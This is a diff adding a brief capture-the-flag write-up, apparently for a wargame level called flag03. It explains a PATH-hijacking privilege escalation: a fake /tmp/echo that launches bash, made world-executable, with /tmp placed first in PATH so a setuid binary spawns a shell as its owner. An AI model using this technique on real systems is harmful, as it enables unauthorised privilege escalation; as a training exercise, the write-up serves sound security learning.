@@ -1,0 +1,9 @@
+the binary uses the echo function (you can see it if you decompile it, or simply cat the binary and look carefully), 
+then creating an echo dummy command that is in fact a shell and changing 
+env path to search in a specific folder where your echo dummy is located
+ you can open a shell as if you where the program owner, that means flag03
+
+
+echo "/bin/bash" > /tmp/echo
+chmod 777 /tmp/echo && export PATH=/tmp:$PATH
+
